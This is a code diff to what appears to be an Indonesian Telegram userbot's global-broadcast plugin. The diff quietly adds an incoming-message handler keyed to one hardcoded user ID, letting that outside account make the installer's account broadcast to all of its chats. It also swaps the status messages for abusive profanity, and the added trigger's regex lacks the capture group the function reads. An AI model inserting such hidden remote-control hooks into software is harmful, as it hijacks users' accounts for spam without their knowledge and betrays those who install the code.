@@ -19,6 +19,7 @@ GCAST_BLACKLIST = [
 
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cgucast$")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -26,9 +27,9 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        await event.edit("**Berikan Sebuah Pesan atau Reply**")
+        await event.edit("**Pesannya Mana ngentot??**")
         return
-    kk = await event.edit("`Globally Broadcasting Msg...`")
+    kk = await event.edit("`Lagi Gua kirim tot, Limit jangan salahin Gua anjing!!!!!`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
@@ -55,7 +56,7 @@ async def gucast(event):
         return await event.edit("`Pesan nya Mana Ngentot?`")
     tt = event.text
     msg = tt[7:]
-    kk = await event.edit("`Sedang Mengirim pesan secara global...`")
+    kk = await event.edit("`Lagi gua kirim tot, Limit jangan salahin gua ya bangsat!!!...`")
     er = 0
     done = 0
     async for x in bot.iter_dialogs():
